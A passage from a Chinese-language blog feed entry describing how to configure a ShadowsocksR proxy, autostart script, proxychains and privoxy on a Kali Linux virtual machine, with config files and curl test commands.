class="string">&quot;0.0.0.0&quot;</span>,   //服务器IP地址</span><br><span class="line">        <span class="string">&quot;server_ipv6&quot;</span>: <span class="string">&quot;::&quot;</span>,</span><br><span class="line">        <span class="string">&quot;server_port&quot;</span>: 2333,  //端口</span><br><span class="line">        <span class="string">&quot;local_address&quot;</span>: <span class="string">&quot;127.0.0.1&quot;</span>, </span><br><span class="line">        <span class="string">&quot;local_port&quot;</span>: 1080,</span><br><span class="line"></span><br><span class="line">        <span class="string">&quot;password&quot;</span>: <span class="string">&quot;password&quot;</span>,  //密码</span><br><span class="line">        <span class="string">&quot;method&quot;</span>: <span class="string">&quot;aes-256-cfb&quot;</span>, //加密方式</span><br><span class="line">        <span class="string">&quot;protocol&quot;</span>: <span class="string">&quot;auth_aes128_md5&quot;</span>, //协议</span><br><span class="line">        <span class="string">&quot;protocol_param&quot;</span>: <span class="string">&quot;&quot;</span>,  //协议参数</span><br><span class="line">        <span class="string">&quot;obfs&quot;</span>: <span class="string">&quot;plain&quot;</span>,  //混淆</span><br><span class="line">        <span class="string">&quot;obfs_param&quot;</span>: <span class="string">&quot;&quot;</span>,  //混淆参数</span><br><span class="line">        <span class="string">&quot;speed_limit_per_con&quot;</span>: 0,</span><br><span class="line">        <span class="string">&quot;speed_limit_per_user&quot;</span>: 0,</span><br><span class="line"></span><br><span class="line">        <span class="string">&quot;additional_ports&quot;</span> : &#123;&#125;, </span><br><span class="line">        <span class="string">&quot;additional_ports_only&quot;</span> : <span class="literal">false</span>, </span><br><span class="line">        <span class="string">&quot;timeout&quot;</span>: 120,</span><br><span class="line">        <span class="string">&quot;udp_timeout&quot;</span>: 60,</span><br><span class="line">        <span class="string">&quot;dns_ipv6&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">        <span class="string">&quot;connect_verbose_info&quot;</span>: 0,</span><br><span class="line">        <span class="string">&quot;redirect&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">        <span class="string">&quot;fast_open&quot;</span>: <span class="literal">false</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="配置代理"><a href="#配置代理" class="headerlink" title="配置代理"></a><strong>配置代理</strong></h3><ul><li>以Firefox为例，Chrome上设置类似。</li><li>在应用商店找到插件 <code>Proxy SwitchyOmega</code>，添加至Chrome</li><li>点击 图标 &gt;&gt; 选项 &gt;&gt; (左边)新建情景模式 ,选第一项 <code>代理服务器</code></li></ul><img src="/2020/08/16/kali%E8%AE%BE%E7%BD%AE%E4%BB%A3%E7%90%86/image-20200814192051948.png" class><h3 id="设置开机启动"><a href="#设置开机启动" class="headerlink" title="设置开机启动"></a><strong>设置开机启动</strong></h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /etc/init.d</span><br><span class="line">touch ssr</span><br><span class="line">chmod +x ssr</span><br><span class="line">vim ssr</span><br></pre></td></tr></table></figure><p>其中ssr的内容为</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"></span><br><span class="line"><span class="comment">### BEGIN INIT INFO</span></span><br><span class="line"><span class="comment"># Provides: ssr    // 程序名，唯一。</span></span><br><span class="line"><span class="comment"># Required-Start: $network $remote_fs $local_fs</span></span><br><span class="line"><span class="comment"># Required-Stop: $network $remote_fs $local_fs</span></span><br><span class="line"><span class="comment"># Default-Start: 2 3 4 5</span></span><br><span class="line"><span class="comment"># Default-Stop: 0 1 6</span></span><br><span class="line"><span class="comment"># Short-Description: ssr    // 启动项的简短说明，随心写。</span></span><br><span class="line"><span class="comment"># Description: shadowsocksR    // 启动项的完整说明，随心写。</span></span><br><span class="line"><span class="comment">### END INIT INFO</span></span><br><span class="line"></span><br><span class="line">nohup ssr start &gt;/dev/null 2&gt;&amp;1 &amp; </span><br><span class="line"></span><br><span class="line"><span class="built_in">exit</span> 0</span><br></pre></td></tr></table></figure><p>设置为开机自启</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">update-rc.d ssr defaults</span><br></pre></td></tr></table></figure><p>删除开机启动</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">update-rc.d -f ssr remove</span><br></pre></td></tr></table></figure><p>开机手动开启或关闭</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ssr start</span><br><span class="line">ssr stop</span><br><span class="line">ssr uninstall  //卸载</span><br></pre></td></tr></table></figure><h3 id="测试"><a href="#测试" class="headerlink" title="测试"></a><strong>测试</strong></h3><img src="/2020/08/16/kali%E8%AE%BE%E7%BD%AE%E4%BB%A3%E7%90%86/image-20200814193445301.png" class><h2 id="终端命令行代理"><a href="#终端命令行代理" class="headerlink" title="终端命令行代理"></a>终端命令行代理</h2><h3 id="使用proxychains"><a href="#使用proxychains" class="headerlink" title="使用proxychains"></a>使用proxychains</h3><p><code>proxychains</code>终端命令行代理神器，科学上网，内网穿透渗透必备</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/proxychains.conf</span><br></pre></td></tr></table></figure><p>编辑配置文件，某尾修改自己的socks5本地代理地址很端口。</p><img src="/2020/08/16/kali%E8%AE%BE%E7%BD%AE%E4%BB%A3%E7%90%86/image-20200814195018483.png" class><h3 id="测试-1"><a href="#测试-1" class="headerlink" title="测试"></a>测试</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains curl https://www.google.com</span><br></pre></td></tr></table></figure><img src="/2020/08/16/kali%E8%AE%BE%E7%BD%AE%E4%BB%A3%E7%90%86/image-20200814195221075.png" class><h3 id="使用privoxy"><a href="#使用privoxy" class="headerlink" title="使用privoxy"></a>使用privoxy</h3><p>使用Privoxy实现，此方法只有临时生效</p><p>首先安装privoxy</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt install -y privoxy</span><br></pre></td></tr></table></figure><p>本次使用全局模式。全局模式，将所有http/https请求走代理服务。</p><p>1.添加本地ssr服务到配置文件</p><blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;forward-socks5 / 127.0.0.1:1080 .&#x27;</span> &gt;&gt; /etc/privoxy/config</span><br></pre></td></tr></table></figure><p>2.Privoxy 默认监听端口是是8118，每次使用都需要添加如下命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> http_proxy=http://127.0.0.1:8118</span><br><span class="line"><span class="built_in">export</span> https_proxy=http://127.0.0.1:8118</span><br><span class="line"><span class="built_in">export</span> no_proxy=localhost</span><br></pre></td></tr></table></figure><p>3.启动服务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">systemctl start privoxy.service</span><br><span class="line">systemctl <span class="built_in">enable</span> privoxy.service</span><br></pre></td></tr></table></figure><p>no_proxy是不经过privoxy代理的地址<br>只能填写具体的ip、域名后缀，多个条目之间使用’,’逗号隔开<br>比如: export no_proxy=”localhost, 192.168.1.1, ip.cn, chinaz.com”<br>访问 localhost、192.168.1.1、ip.cn、*.ip.cn、chinaz.com、*.chinaz.com 将不使用代理</p></blockquote><p>查看出口配置</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span></span><br></pre></td></tr></table></figure><img src="/2020/08/16/kali%E8%AE%BE%E7%BD%AE%E4%BB%A3%E7%90%86/image-20200815140327118.png" class><h3 id="测试-2"><a href="#测试-2" class="headerlink" title="测试"></a>测试</h3><p>出现网页源码则为成功</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">curl -sL facebook.com</span><br><span class="line">curl -sL www.baidu.com</span><br><span class="line">curl -sL www.google.com</span><br></pre></td></tr></table></figure><img src="/2020/08/16/kali%E8%AE%BE%E7%BD%AE%E4%BB%A3%E7%90%86/image-20200815140200323.png" class>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;由于经常需要在vm中使用kali，并且要大量下载国外资源，所以没有一个滋润的代理&lt;br&gt;是不能忍受的！你要佛系当我没说。。。下面来解决一下这个问题&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="kali" scheme="https://lunamoore.github.io/categories/kali/"/>
    
    
    <category term="linux" scheme="https://lunamoore.github.io/tags/linux/"/>
    
  </entry>
  
</feed>
